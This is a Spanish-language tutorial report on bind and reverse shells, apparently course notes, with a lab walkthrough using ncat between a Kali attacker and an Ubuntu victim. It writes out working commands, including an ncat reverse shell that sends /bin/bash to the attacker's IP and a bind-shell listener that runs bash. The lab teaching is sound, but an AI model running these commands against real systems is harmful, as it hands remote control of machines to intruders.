Documentos de Referencia: "AS-I - Shells.pdf"

# Informe Técnico: Fundamentos de Shells en Ciberseguridad

## 1. Resumen Ejecutivo
Este informe técnico profundiza en el concepto de **shell** y su papel crucial en ciberseguridad, con un enfoque particular en las **Bind shells** y **Reverse shells**. Se explica la diferencia entre estos dos tipos de técnicas de conexión remota, sus ventajas y desventajas, y se detallan los procedimientos prácticos para establecer cada una de ellas utilizando la herramienta `ncat` en un entorno de laboratorio. El objetivo es ofrecer una comprensión completa de cómo estas técnicas permiten a un atacante obtener control sobre un sistema objetivo.

---

## 2. Conceptos Fundamentales
* **Shell:** Una *shell* es un software que actúa como intermediario entre el usuario y el *kernel* de un sistema operativo. Proporciona una interfaz para que el usuario acceda a los servicios del *kernel*.
    * **Tipos de Interfaz:** Pueden ser **CLI** (*Command-Line Interface*), **GUI** (*Graphical User Interface*) o **NUI** (*Natural User Interface*).
    * **Ejemplos de Shell CLI:**
        * **Linux:** Bash y Zsh.
        * **Windows:** Cmd.
* **Bind Shell:** En una **Bind shell**, el atacante configura un servicio en la máquina objetivo para que escuche en un puerto de red específico a la espera de conexiones entrantes. El atacante, una vez que la conexión se establece, obtiene control sobre el sistema remoto. El término *Bind* (vincular) hace referencia a que la *shell* está vinculada a un puerto a la espera de conexiones.
* **Reverse Shell:** En una **Reverse shell**, es la máquina objetivo (la víctima) la que actúa como cliente y se conecta a un puerto específico en la máquina del atacante, que está a la escucha. Esta técnica es especialmente útil cuando la máquina víctima se encuentra detrás de un *firewall* o una red NAT, lo que dificulta una conexión directa entrante para una **Bind shell**.
* **Comparativa de Bind vs. Reverse Shell:**
    * **Iniciador de la conexión:** El atacante en una **Bind shell** y el objetivo en una **Reverse shell**.
    * **Puerto abierto requerido:** En el objetivo para una **Bind shell** y en el atacante para una **Reverse shell**.
    * **Sigilo:** La **Bind shell** es más sigilosa porque no requiere una conexión saliente, a diferencia de la **Reverse shell**, que puede ser detectada por los *firewalls* o sistemas de detección de intrusiones.
    * **Estabilidad:** La **Bind shell** se considera más estable porque la conexión se mantiene mientras el atacante está conectado. La **Reverse shell** es más propensa a interrupciones.
    * **Versatilidad:** La **Reverse shell** es mucho más versátil, ya que permite la conexión a equipos que se encuentran detrás de redes NAT o *firewalls* restrictivos, algo impensable para una **Bind shell**.

---

## 3. Procedimientos Prácticos
Los siguientes procedimientos detallan cómo establecer una **Bind shell** y una **Reverse shell** utilizando las máquinas de laboratorio: una máquina **Kali Linux** (atacante, IP: `10.0.1.8`) y una **Ubuntu Server** (víctima, IP: `10.0.1.4`).

### Configuración de una Bind Shell
En este escenario, el atacante se conecta a un puerto de la máquina víctima.

1.  **Configurar la máquina víctima (Ubuntu Server):**
    * Abre una terminal en la máquina víctima.
    * Ejecuta el comando `ncat` para que la máquina se ponga a la escucha en un puerto específico y ejecute una *shell* al recibir una conexión.
    * Comando a ejecutar: `ncat -lvnp 4444 -e /bin/bash`.
    * **Explicación de los parámetros del comando `ncat`:**
        * `-l` o `-listen`: Pone a `ncat` en modo de escucha para conexiones entrantes.
        * `-v` o `-verbose`: Activa el modo verboso para mostrar información detallada sobre las conexiones.
        * `-n` o `-no-dns`: Evita que `ncat` haga una resolución DNS.
        * `-p <puerto>` o `--port`: Indica el puerto donde `ncat` se pondrá a la escucha.
        * `-e <binario>` o `--exec`: Especifica el binario que se ejecutará al recibir una conexión entrante, en este caso, la *shell* `/bin/bash`.
    * El sistema ahora está a la espera de una conexión entrante, como se muestra en la captura de pantalla donde se indica `Ncat: Listening on 0.0.0.0:4444`.

2.  **Conectarse desde la máquina atacante (Kali Linux):**
    * Abre una terminal en la máquina atacante.
    * Utiliza el comando `nc` (Netcat) para conectarte al puerto abierto en la máquina víctima.
    * Comando a ejecutar: `nc 10.0.1.4 4444`.
    * Al ejecutar el comando y presionar Enter, se establece la conexión, y la terminal del atacante recibirá la *shell* de la máquina víctima.
    * Puedes verificar el éxito ejecutando comandos como `whoami` y `ip a`, que mostrarán la información del usuario (`test`) y la dirección IP de la máquina víctima (`10.0.1.4`), lo que confirma que se ha obtenido el control del sistema remoto.

### Configuración de una Reverse Shell
En este escenario, el atacante se pone a la escucha para recibir una conexión de la máquina víctima.

1.  **Configurar la máquina atacante (Kali Linux):**
    * Abre una terminal en la máquina atacante.
    * Usa el comando `nc` con los parámetros `-lvnp` para poner a la máquina a la escucha en un puerto, por ejemplo, el 4444.
    * Comando a ejecutar: `nc -lvnp 4444`.
    * El sistema mostrará `listening on [any] 4444`, indicando que está listo para recibir conexiones.

2.  **Configurar la máquina víctima (Ubuntu Server):**
    * Abre una terminal en la máquina víctima.
    * Ejecuta el comando `ncat` para que la máquina se conecte a la IP del atacante y le envíe la *shell*.
    * Comando a ejecutar: `ncat 10.0.1.8 4444 -e /bin/bash`.
    * **Explicación del comando `ncat`:**
        * `ncat`: Herramienta para la transferencia de datos y la conexión a puertos.
        * `10.0.1.8`: La dirección IP del atacante.
        * `4444`: El puerto en el que el atacante está a la escucha.
        * `-e /bin/bash`: Especifica el binario de la *shell* que se va a enviar.
    * Al ejecutar el comando, la conexión se establecerá, y la terminal del atacante recibirá la *shell* de la máquina víctima, lo que se puede verificar con `whoami` y `ip a`, que mostrarán la información del usuario (`test`) y la IP (`10.0.1.4`) de la máquina víctima.

---

## 4. Conclusiones y Puntos Clave
### Importancia y Beneficios de Seguridad
El dominio de las técnicas de **Bind shell** y **Reverse shell** es fundamental para cualquier profesional de ciberseguridad, ya que representan métodos esenciales para obtener y mantener acceso a un sistema comprometido. Entender sus diferencias es crítico para planificar un ataque o auditar una red. Por ejemplo, en un escenario de pentesting, el atacante debe saber que una **Reverse shell** es la técnica más versátil y efectiva para sortear las protecciones perimetrales, como los *firewalls* y las redes NAT, que suelen bloquear las conexiones entrantes.

### Puntos de Aprendizaje Clave
* Una **shell** es el software que permite la interacción entre un usuario y el sistema operativo.
* Las **Bind shells** son útiles cuando la máquina objetivo tiene un puerto abierto accesible desde el exterior, mientras que las **Reverse shells** son la solución para penetrar sistemas detrás de *firewalls* o redes NAT.
* La herramienta `ncat` (parte de Nmap) es versátil y se puede usar tanto para escuchar conexiones (`-l`) como para conectarse y ejecutar comandos (`-e`).
* La habilidad para interpretar la salida de los comandos (`ip a` o `whoami`) es vital para confirmar que la conexión y el acceso a la máquina objetivo han sido exitosos.

### Relevancia Técnica
El conocimiento práctico de cómo funcionan y se implementan las **Bind shells** y **Reverse shells** es una habilidad técnica de gran relevancia en el campo de la ciberseguridad. Los procedimientos aprendidos son la base de la fase de explotación en un pentesting y son aplicables a escenarios de la vida real. La capacidad de utilizar herramientas como `ncat` para manipular flujos de datos y establecer conexiones de forma manual demuestra una comprensión profunda de los protocolos de red y de la funcionalidad de las *shells*, lo que es crucial para cualquier profesional que realice pruebas de penetración o análisis forense.